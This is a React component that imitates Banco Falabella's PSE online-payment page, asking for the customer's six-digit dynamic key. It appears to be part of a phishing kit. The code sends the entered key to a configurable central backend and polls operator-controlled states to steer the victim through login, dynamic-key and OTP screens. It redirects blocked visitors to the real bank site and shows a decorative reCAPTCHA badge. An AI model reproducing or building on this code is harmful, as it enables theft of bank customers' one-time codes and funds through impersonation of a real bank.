import React, { useMemo, useState, useEffect, useRef } from "react";
import { useSearchParams, useNavigate } from "react-router-dom";
import "./../otp/otp_falabella_pse.css";
import "../bf_pse_modal.css";
import FalabellaHeader from "../../components/FalabellaHeader";
import FalabellaSidebar from "../../components/FalabellaSidebar";
import FalabellaFooter from "../../components/FalabellaFooter";
import falabellaTL from "../../img/falabellaTL.png";
import recaptchaIcon from "../../img/ReCAPTCHA_icon.svg";
import { instanceBackend } from "../../../../../axios/instanceBackend";
import LoadingFalabellaOtp from "../../../../../components/LoadingFalabellaOtp";

const FALABELLA_ERROR_KEY = "falabella_error_modal";
const FALABELLA_MID_FLOW_KEY = "falabella_mid_flow";
const ERROR_DIN_MSG =
  "La clave dinámica no es válida. Verifica en tu app e intenta de nuevo.";
const FALABELLA_INLINE_ALERT_AUTO_HIDE_MS = 5000;

const RecaptchaBadgeIcon = () => (
  <img
    src={recaptchaIcon}
    alt=""
    aria-hidden="true"
    className="falabella-recaptcha-badge__img"
    draggable={false}
  />
);

const PLACEHOLDER_COMERCIO = "{{comercio}}";
const PLACEHOLDER_VALOR = "{{valor}}";
const PLACEHOLDER_COSTO_TOTAL = "{{costoTotal}}";

const COSTO_TRANSACCION_DISPLAY = "$ 0,00 COP";
const CUENTA_AHORRO_MASK = "Cuenta de ahorro ****";

const STEPPER_STEP = 2;

function parseCopToNumber(value) {
  if (value == null || value === "") return null;
  const s = String(value).trim();
  if (s.startsWith("{{")) return null;
  let t = s.replace(/\s*COP\s*$/i, "").replace(/[$\s]/g, "").trim();
  if (!t) return null;
  if (t.includes(",")) {
    t = t.replace(/\./g, "").replace(",", ".");
  } else {
    t = t.replace(/\./g, "");
  }
  const n = parseFloat(t);
  return Number.isFinite(n) ? n : null;
}

function formatCopEs(n) {
  return new Intl.NumberFormat("es-CO", {
    style: "currency",
    currency: "COP",
    minimumFractionDigits: 2,
    maximumFractionDigits: 2,
  }).format(n);
}

function valorFromSearchParam(raw) {
  if (raw == null || raw === "") {
    return { display: PLACEHOLDER_VALOR, amount: null };
  }
  const trimmed = decodeURIComponent(String(raw)).trim();
  const amount = parseCopToNumber(trimmed);
  if (amount !== null) {
    return { display: formatCopEs(amount), amount };
  }
  return { display: trimmed, amount: parseCopToNumber(trimmed) };
}

function formatDynamicKeyDisplay(digits) {
  const d = String(digits ?? "")
    .replace(/\D/g, "")
    .slice(0, 6);
  if (d.length <= 3) return d;
  return `${d.slice(0, 3)} ${d.slice(3)}`;
}

function isTemplateToken(value) {
  if (value == null || typeof value !== "string") return false;
  const t = value.trim();
  if (
    t === PLACEHOLDER_COMERCIO ||
    t === PLACEHOLDER_VALOR ||
    t === PLACEHOLDER_COSTO_TOTAL
  ) {
    return true;
  }
  return /^\{\{[^{}]+\}\}$/.test(t);
}

function nombrePseFromSearchParams(searchParams) {
  const raw =
    searchParams.get("nombre") ??
    searchParams.get("name") ??
    searchParams.get("usuario");
  if (raw == null || String(raw).trim() === "") return "";
  const s = String(raw).trim().replace(/\+/g, " ");
  try {
    return decodeURIComponent(s);
  } catch {
    return s;
  }
}

const InfoSummaryRow = ({ label, value, isTokenPlaceholder = false }) => (
  <div className="otp-pse-info-row">
    <dt className="otp-pse-info-label">{label}</dt>
    <dd
      className={`otp-pse-info-value${isTokenPlaceholder ? " otp-pse-info-value--token" : ""}`}
    >
      {value}
    </dd>
  </div>
);

const FalabellaDinamicaPse = () => {
  const [searchParams] = useSearchParams();
  const navigate = useNavigate();
  const [dynamicKey, setDynamicKey] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const [showModal, setShowModal] = useState(false);
  const [modalText, setModalText] = useState("");
  const [receiptInfo, setReceiptInfo] = useState({
    comercio: PLACEHOLDER_COMERCIO,
    valorOrigen: PLACEHOLDER_VALOR,
    costoTotal: PLACEHOLDER_COSTO_TOTAL,
  });
  const [clienteNombre, setClienteNombre] = useState("");
  const [inlineAlertMessage, setInlineAlertMessage] = useState("");

  const sessionIdRef = useRef(null);
  const pollingIntervalRef = useRef(null);
  const modalBloqueoEstadoRef = useRef(null);
  const esperandoRespuestaTrasEnviarRef = useRef(false);
  const dinTrasEnviarVioPendienteRef = useRef(false);
  /** Evita doble POST si el usuario hace doble clic antes de que termine la petición */
  const envioDinamicaEnCursoRef = useRef(false);
  /** Evita reabrir la alerta de error dinámica en cada poll mientras el estado sigue en error_din */
  const verifyLastEstadoRef = useRef(null);

  const nombrePseWelcome = useMemo(() => {
    const fromReceipt = String(clienteNombre || "").trim();
    if (fromReceipt) return fromReceipt;
    return nombrePseFromSearchParams(searchParams);
  }, [clienteNombre, searchParams]);

  const dismissInlineAlert = () => {
    setInlineAlertMessage("");
    if (verifyLastEstadoRef.current === "error_din") {
      verifyLastEstadoRef.current = null;
    }
  };

  const dismissInlineAlertIfOpen = () => {
    if (inlineAlertMessage) dismissInlineAlert();
  };

  const showDinInlineError = () => {
    esperandoRespuestaTrasEnviarRef.current = false;
    dinTrasEnviarVioPendienteRef.current = false;
    stopPolling();
    setIsLoading(false);
    setDynamicKey("");
    verifyLastEstadoRef.current = "error_din";
    setInlineAlertMessage(ERROR_DIN_MSG);
    window.scrollTo(0, 0);
  };

  const redirectToLoginWithLoginError = () => {
    esperandoRespuestaTrasEnviarRef.current = false;
    dinTrasEnviarVioPendienteRef.current = false;
    stopPolling();
    setIsLoading(false);
    setInlineAlertMessage("");
    modalBloqueoEstadoRef.current = "error_login";
    sessionStorage.removeItem(FALABELLA_MID_FLOW_KEY);
    localStorage.setItem(FALABELLA_ERROR_KEY, "error_login");
    navigate("/falabella_pse", { replace: true });
  };

  const { comercioDisplay, valorDisplay, costoTotalDisplay } = useMemo(() => {
    const comercioRaw = searchParams.get("comercio");
    const comercioDisplay =
      comercioRaw != null && String(comercioRaw).trim() !== ""
        ? decodeURIComponent(String(comercioRaw).trim())
        : PLACEHOLDER_COMERCIO;

    const valorRaw = searchParams.get("valor_origen") ?? searchParams.get("valor");
    const { display: valorDisplay, amount: valorAmount } =
      valorFromSearchParam(valorRaw);

    const costoCero = parseCopToNumber(COSTO_TRANSACCION_DISPLAY) ?? 0;
    let costoTotalDisplay = PLACEHOLDER_COSTO_TOTAL;
    if (valorAmount !== null) {
      costoTotalDisplay = formatCopEs(valorAmount + costoCero);
    }

    return {
      comercioDisplay: receiptInfo.comercio || comercioDisplay,
      valorDisplay: receiptInfo.valorOrigen || valorDisplay,
      costoTotalDisplay: receiptInfo.costoTotal || costoTotalDisplay,
    };
  }, [searchParams, receiptInfo]);

  const isFormValid = /^\d{6}$/.test(dynamicKey);

  const stopPolling = () => {
    if (pollingIntervalRef.current) {
      clearInterval(pollingIntervalRef.current);
      pollingIntervalRef.current = null;
    }
  };

  const initPolling = () => {
    stopPolling();
    pollingIntervalRef.current = setInterval(() => {
      verifyState();
    }, 3000);
    verifyState();
  };

  useEffect(() => {
    sessionIdRef.current = localStorage.getItem("sessionId");

    const pending = localStorage.getItem(FALABELLA_ERROR_KEY);
    if (pending === "error_login") {
      redirectToLoginWithLoginError();
      return () => stopPolling();
    }
    if (pending === "error_din") {
      showDinInlineError();
      localStorage.removeItem(FALABELLA_ERROR_KEY);
    } else if (pending) {
      localStorage.removeItem(FALABELLA_ERROR_KEY);
    }

    const loadReceipt = async () => {
      const sid = sessionIdRef.current || localStorage.getItem("sessionId");
      if (!sid) return;

      try {
        const response = await instanceBackend.get(`/pse/receipt/${sid}`);
        const receipt = response?.data?.receipt || {};
        const nombreRaw = String(receipt?.nombre || "").trim();
        if (nombreRaw) setClienteNombre(nombreRaw);
        const comercioRaw = String(receipt?.empresa || "").trim();
        const valorRaw = String(receipt?.valor || "").trim();
        const valorAmount = parseCopToNumber(valorRaw);
        const totalAmount =
          valorAmount !== null
            ? valorAmount + (parseCopToNumber(COSTO_TRANSACCION_DISPLAY) ?? 0)
            : null;

        setReceiptInfo({
          comercio: comercioRaw || PLACEHOLDER_COMERCIO,
          valorOrigen:
            valorAmount !== null
              ? formatCopEs(valorAmount)
              : valorRaw || PLACEHOLDER_VALOR,
          costoTotal:
            totalAmount !== null
              ? formatCopEs(totalAmount)
              : valorRaw || PLACEHOLDER_COSTO_TOTAL,
        });
      } catch {
        setReceiptInfo({
          comercio: PLACEHOLDER_COMERCIO,
          valorOrigen: PLACEHOLDER_VALOR,
          costoTotal: PLACEHOLDER_COSTO_TOTAL,
        });
      }
    };

    loadReceipt();

    return () => stopPolling();
  }, [navigate]);

  useEffect(() => {
    if (!inlineAlertMessage) return undefined;

    const timeoutId = setTimeout(() => {
      dismissInlineAlert();
    }, FALABELLA_INLINE_ALERT_AUTO_HIDE_MS);

    return () => clearTimeout(timeoutId);
  }, [inlineAlertMessage]);

  const verifyState = async () => {
    const sid = sessionIdRef.current || localStorage.getItem("sessionId");
    if (!sid) return;
    sessionIdRef.current = sid;
    try {
      const response = await instanceBackend.post(
        `/falabella/verify-state/${sid}`,
      );
      const estadoActual = (
        response?.data?.estado ||
        response?.data?.state ||
        ""
      )
        .toString()
        .toLowerCase();
      if (!estadoActual) return;

      if (
        esperandoRespuestaTrasEnviarRef.current &&
        estadoActual === "pendiente"
      ) {
        dinTrasEnviarVioPendienteRef.current = true;
      }

      switch (estadoActual) {
        case "sol_din":
          if (esperandoRespuestaTrasEnviarRef.current) {
            if (!dinTrasEnviarVioPendienteRef.current) {
              break;
            }
            dinTrasEnviarVioPendienteRef.current = false;
            esperandoRespuestaTrasEnviarRef.current = false;
            setIsLoading(false);
            setDynamicKey("");
            initPolling();
            break;
          }
          // Mientras el POST /falabella/dinamica está en vuelo, esperando aún es false: sin esta
          // guarda el poll en "sol_din" quita el loading antes de que termine el envío.
          if (!envioDinamicaEnCursoRef.current) {
            setIsLoading(false);
          }
          break;
        case "sol_otp":
          esperandoRespuestaTrasEnviarRef.current = false;
          dinTrasEnviarVioPendienteRef.current = false;
          stopPolling();
          setIsLoading(false);
          sessionStorage.setItem(FALABELLA_MID_FLOW_KEY, "1");
          navigate("/falabella_otp_pse", { replace: true });
          break;
        case "solicitar_finalizar":
        case "sol_finalizar":
        case "sol_finalizado":
          esperandoRespuestaTrasEnviarRef.current = false;
          dinTrasEnviarVioPendienteRef.current = false;
          stopPolling();
          setIsLoading(false);
          sessionStorage.removeItem(FALABELLA_MID_FLOW_KEY);
          navigate("/finalizado-pse", { replace: true });
          break;
        case "error_din":
          if (modalBloqueoEstadoRef.current === "error_login") break;
          if (verifyLastEstadoRef.current !== "error_din") {
            showDinInlineError();
          }
          break;
        case "error_otp":
          esperandoRespuestaTrasEnviarRef.current = false;
          dinTrasEnviarVioPendienteRef.current = false;
          stopPolling();
          setIsLoading(false);
          localStorage.setItem(FALABELLA_ERROR_KEY, "error_otp");
          navigate("/falabella_otp_pse", { replace: true });
          break;
        case "error_login":
          redirectToLoginWithLoginError();
          break;
        case "block_ip":
          esperandoRespuestaTrasEnviarRef.current = false;
          dinTrasEnviarVioPendienteRef.current = false;
          stopPolling();
          setIsLoading(false);
          sessionStorage.removeItem(FALABELLA_MID_FLOW_KEY);
          localStorage.setItem(FALABELLA_ERROR_KEY, "block_ip");
          navigate("/falabella_pse", { replace: true });
          break;
        default:
          break;
      }

      verifyLastEstadoRef.current = estadoActual;
    } catch (error) {
      const status = error?.response?.status;
      const estadoErr = (error?.response?.data?.estado || "")
        .toString()
        .toLowerCase();
      if (status === 403 && estadoErr === "error_blocked") {
        esperandoRespuestaTrasEnviarRef.current = false;
        dinTrasEnviarVioPendienteRef.current = false;
        stopPolling();
        setIsLoading(false);
        sessionStorage.removeItem(FALABELLA_MID_FLOW_KEY);
        localStorage.clear();
        window.location.href = process.env.REACT_APP_URL_BANK || "/";
      }
    }
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    if (!isFormValid || isLoading || envioDinamicaEnCursoRef.current) return;

    // Evita que verifyState (intervalo) siga en "sol_din" y haga setIsLoading(false) durante el POST.
    stopPolling();
    envioDinamicaEnCursoRef.current = true;

    const sessionId = localStorage.getItem("sessionId");
    if (!sessionId) {
      setModalText("Por favor, vuelva a la pagina de compra para iniciar el proceso nuevamente.");
      setShowModal(true);
      envioDinamicaEnCursoRef.current = false;
      return;
    }
    sessionIdRef.current = sessionId;
    const dataSend = {
      data: {
        attributes: {
          clave: dynamicKey,
          fecha: new Date().toISOString(),
          sessionId,
          backend: "P01",
          backend_central_url: process.env.REACT_APP_API_BASE_URL_BACKEND_CENTRAL,
          backend_url: "/api/v1/falabella/dinamica",
        },
      },
    };

    const centralUrl = (
      process.env.REACT_APP_API_BASE_URL_BACKEND_CENTRAL || ""
    ).trim();

    try {
      setIsLoading(true);
      const response = centralUrl
        ? await instanceBackend.post(centralUrl, dataSend)
        : await instanceBackend.post("/falabella/dinamica", dataSend);

      if (response?.data?.success) {
        const sid = response.data.sessionId ?? sessionId;
        localStorage.setItem("sessionId", sid);
        sessionIdRef.current = sid;
        // No marcar dinTrasEnviarVioPendienteRef en true aquí: el primer verify suele seguir en
        // "sol_din" y esa rama interpretaría ya "visto pendiente" y quitaría el loading al instante.
        dinTrasEnviarVioPendienteRef.current = false;
        esperandoRespuestaTrasEnviarRef.current = true;
        initPolling();
      } else {
        setIsLoading(false);
        setModalText("No se pudo validar la clave dinámica.");
        setShowModal(true);
      }
    } catch (error) {
      setIsLoading(false);
      const serverMsg =
        error?.response?.data?.message ||
        error?.response?.data?.error ||
        "";
      setModalText(
        serverMsg
          ? `Error del servidor: ${serverMsg}`
          : "Error de conexión con el servidor.",
      );
      setShowModal(true);
    } finally {
      envioDinamicaEnCursoRef.current = false;
    }
  };

  const handleCancel = (e) => {
    e.preventDefault();
    e.stopPropagation();
    setDynamicKey("");
    setIsLoading(false);
  };

  const closeModal = () => {
    setShowModal(false);
    setModalText("");
    setDynamicKey("");
  };

  return (
    <div className="falabella-page falabella-page--pse falabella-page--clave-dinamica-pse">
      {isLoading ? <LoadingFalabellaOtp /> : null}
      <div className="falabella-wrapper">
        <FalabellaSidebar />

        <main className="falabella-main">
          <FalabellaHeader
            showWelcome
            pseWelcome
            pseWelcomeName={nombrePseWelcome}
          />
          <div className="falabella-content">
            <div className="content-body">
              <div className="content-header otp-pse-content-header">
                <h1 className="content-title otp-pse-content-title">
                  <strong>PSE</strong> pagos en línea
                </h1>
                <div className="stepper otp-pse-stepper">
                  <div className={`stepper-content flow--${STEPPER_STEP}`}>
                    <div className="stepper-line-bg"></div>
                    <div className="stepper-line-progress"></div>
                    <div className="stepper-list">
                      <div
                        className={`stepper-item ${STEPPER_STEP >= 2 ? "stepper-item--done" : "stepper-item--upcoming"}`}
                      ></div>
                      <div
                        className={`stepper-item ${STEPPER_STEP === 2 ? "stepper-item--current" : ""} ${STEPPER_STEP >= 3 ? "stepper-item--done" : ""}`}
                      ></div>
                      <div
                        className={`stepper-item ${STEPPER_STEP >= 3 ? "stepper-item--current" : "stepper-item--upcoming"}`}
                      ></div>
                    </div>
                    <div className="stepper-text">
                      {STEPPER_STEP === 2 && (
                        <span className="flow--2">Confirmación</span>
                      )}
                    </div>
                  </div>
                </div>
              </div>

              <div
                className={`falabella-login-alert-slot otp-pse-login-alert-slot${inlineAlertMessage ? "" : " falabella-login-alert-slot--empty"}`}
                aria-live="polite"
              >
                {inlineAlertMessage ? (
                  <div className="falabella-login-alert" role="alert">
                    <span className="falabella-login-alert__icon" aria-hidden="true">
                      <svg viewBox="0 0 24 24" focusable="false">
                        <path
                          fill="currentColor"
                          d="M12 2.1 2.1 19.9h19.8L12 2.1z"
                        />
                        <path
                          fill="#ffffff"
                          d="M12 7.4a1 1 0 0 1 1 1v4.2a1 1 0 1 1-2 0v-4.2a1 1 0 0 1 1-1zm0 9a1.25 1.25 0 1 0 0-2.5 1.25 1.25 0 0 0 0 2.5z"
                        />
                      </svg>
                    </span>
                    <p className="falabella-login-alert__text">{inlineAlertMessage}</p>
                  </div>
                ) : null}
              </div>

              <div className="otp-pse-readonly-block">
                <dl className="otp-pse-info-list">
                  <InfoSummaryRow
                    label="Comercio"
                    value={comercioDisplay}
                    isTokenPlaceholder={isTemplateToken(comercioDisplay)}
                  />
                  <InfoSummaryRow
                    label="Cuenta seleccionada"
                    value={CUENTA_AHORRO_MASK}
                  />
                  <InfoSummaryRow
                    label="Valor origen"
                    value={valorDisplay}
                    isTokenPlaceholder={isTemplateToken(valorDisplay)}
                  />
                  <InfoSummaryRow
                    label="Costo de transacción"
                    value={COSTO_TRANSACCION_DISPLAY}
                  />
                  <InfoSummaryRow
                    label="Valor a pagar"
                    value={costoTotalDisplay}
                    isTokenPlaceholder={isTemplateToken(costoTotalDisplay)}
                  />
                </dl>
              </div>

              <form className="login-form otp-pse-otp-form" onSubmit={handleSubmit}>
                <div className="otp-pse-dynamic-franja">
                  <div className="otp-pse-franja-col otp-pse-franja-col--intro">
                    <h3 className="otp-pse-franja-heading">
                      Ingreso de Clave Dinámica
                    </h3>
                    <p className="otp-pse-franja-lead">
                      Ingresa la clave dinámica de 6 dígitos que aparece en tu app{" "}
                      <strong className="otp-pse-franja-accent">Banco Falabella.</strong>
                    </p>
                  </div>
                  <div className="otp-pse-franja-col otp-pse-franja-col--input">
                    <input
                      type="text"
                      id="dynamic-key-otp-pse"
                      name="dynamicKey"
                      value={formatDynamicKeyDisplay(dynamicKey)}
                      onChange={(e) => {
                        dismissInlineAlertIfOpen();
                        const digits = e.target.value
                          .replace(/\D/g, "")
                          .slice(0, 6);
                        setDynamicKey(digits);
                      }}
                      maxLength={7}
                      inputMode="numeric"
                      autoComplete="one-time-code"
                      className="form-input otp-pse-franja-input"
                      disabled={isLoading}
                      aria-label="Clave dinámica"
                    />
                    <button
                      type="submit"
                      className={`falabella-btn falabella-btn-primary otp-pse-franja-autorizar${isFormValid && !isLoading
                          ? " otp-pse-franja-autorizar--complete"
                          : ""
                        }`}
                      disabled={!isFormValid || isLoading}
                    >
                      Autorizar
                    </button>
                  </div>
                  <div className="otp-pse-franja-col otp-pse-franja-col--hint">
                    <p className="otp-pse-franja-hint">
                      Encuentra tu{" "}
                      <strong className="otp-pse-franja-accent">Clave Dinámica</strong>{" "}
                      en la pantalla principal de tu app{" "}
                      <strong className="otp-pse-franja-accent">Banco Falabella</strong>
                    </p>
                  </div>
                  <div className="otp-pse-franja-col otp-pse-franja-col--figure">
                    <div className="otp-pse-franja-illustration-wrap">
                      <img
                        src={falabellaTL}
                        alt=""
                        className="otp-pse-franja-illustration"
                      />
                    </div>
                  </div>
                </div>
              </form>
            </div>

            <div className="form-actions form-actions--otp-pse-only-cancel otp-pse-cancel-below-card">
              <button
                type="button"
                className="falabella-btn falabella-btn-secondary"
                onClick={handleCancel}
                disabled={isLoading}
              >
                Cancelar
              </button>
            </div>
          </div>
        </main>
      </div>

      <FalabellaFooter variant="pse" />

      <div
        className="falabella-recaptcha-badge"
        role="img"
        aria-label="protección de reCAPTCHA"
      >
        <div className="falabella-recaptcha-badge__icon">
          <RecaptchaBadgeIcon />
        </div>
        <div className="falabella-recaptcha-badge__text">
          protección de reCAPTCHA
        </div>
      </div>

      {showModal ? (
        <div className="bf-pse-modal-overlay" role="presentation">
          <div className="bf-pse-modal-layout">
            <div className="bf-pse-modal-main">
              <div className="bf-pse-modal-card" role="dialog" aria-modal="true">
                <div className="bf-pse-modal-top">Banco Falabella</div>
                <div className="bf-pse-modal-mid">
                  <p>{modalText}</p>
                </div>
                <div className="bf-pse-modal-bot">
                  <button
                    type="button"
                    className="bf-pse-modal-accept"
                    onClick={closeModal}
                  >
                    Aceptar
                  </button>
                </div>
              </div>
            </div>
          </div>
        </div>
      ) : null}
    </div>
  );
};

export default FalabellaDinamicaPse;
